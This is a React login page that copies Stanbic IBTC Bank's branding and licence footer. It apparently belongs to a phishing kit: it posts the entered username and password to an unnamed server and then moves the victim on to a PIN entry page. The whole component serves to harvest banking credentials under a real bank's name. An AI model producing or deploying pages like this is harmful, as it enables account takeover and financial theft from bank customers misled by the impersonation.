import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";
import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";
import { IoChevronBack } from "react-icons/io5";
import { BsLightningCharge } from "react-icons/bs";
import { FiPhone } from "react-icons/fi";

const schema = yup.object().shape({
  username: yup.string().required("Username is required"),
  password: yup.string().required("Password is required"),
});

const Home = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [saveUsername, setSaveUsername] = useState(false);

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({
    resolver: yupResolver(schema),
  });

  const togglePassword = () => {
    setShowPassword(!showPassword);
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/`, data)
      .then((response) => {
        console.log(response.data);
        navigate("/pin");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="min-h-screen bg-[#0047BB] flex flex-col">
      {/* Header */}
      <div className="flex items-center justify-between p-4">
        <button className="text-white text-2xl">
          <IoChevronBack />
        </button>
        <img
          src="/path-to-stanbic-logo.png"
          alt="Stanbic IBTC Logo"
          className="h-12 w-12"
        />
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col px-6 pt-8">
        {/* Form Section */}
        <form onSubmit={handleSubmit(submitForm)} className="flex-1">
          {/* Username Input */}
          <div className="mb-6">
            <label className="text-white text-sm mb-2 block font-light">
              USERNAME
            </label>
            <input
              name="username"
              type="text"
              placeholder="Enter here"
              {...register("username")}
              className="w-full bg-transparent border-2 border-white/30 rounded-lg px-4 py-4 text-white placeholder-white/50 text-lg focus:outline-none focus:border-white/60"
            />
            <FormErrMsg errors={errors} inputName="username" />
          </div>

          {/* Password Input */}
          <div className="mb-6">
            <label className="text-white text-sm mb-2 block font-light">
              PASSWORD
            </label>
            <div className="relative">
              <input
                name="password"
                type={showPassword ? "text" : "password"}
                placeholder="Enter here"
                {...register("password")}
                className="w-full bg-transparent border-2 border-white/30 rounded-lg px-4 py-4 text-white placeholder-white/50 text-lg focus:outline-none focus:border-white/60"
              />
              <button
                type="button"
                onClick={togglePassword}
                className="absolute right-4 top-1/2 -translate-y-1/2 text-white text-xl"
              >
                {showPassword ? <AiOutlineEyeInvisible /> : <AiOutlineEye />}
              </button>
            </div>
            <FormErrMsg errors={errors} inputName="password" />
          </div>

          {/* Save Username Toggle */}
          <div className="flex items-center justify-between mb-8">
            <span className="text-white text-base">Save Username</span>
            <button
              type="button"
              onClick={() => setSaveUsername(!saveUsername)}
              className={`w-16 h-8 rounded-full relative transition-colors ${
                saveUsername ? "bg-white" : "bg-white/30"
              }`}
            >
              <div
                className={`absolute top-1 w-6 h-6 rounded-full transition-all ${
                  saveUsername ? "right-1 bg-gray-600" : "left-1 bg-white"
                }`}
              />
            </button>
          </div>

          {/* Login Button */}
          <button
            type="submit"
            disabled={loading}
            className="w-full bg-white text-[#0047BB] font-bold text-lg py-4 rounded-lg mb-6 disabled:opacity-50"
          >
            {loading ? "Loading..." : "LOGIN"}
          </button>

          {/* Footer Links */}
          <div className="flex items-center justify-between text-white text-sm mb-8">
            <a href="/forgot-password" className="font-light">
              Forgot Password?
            </a>
          </div>
        </form>

        {/* Footer Text */}
        <p className="text-white text-xs text-center pb-6">
          Stanbic IBTC Bank is licensed by the Central Bank of Nigeria
        </p>
      </div>
    </div>
  );
};

export default Home;
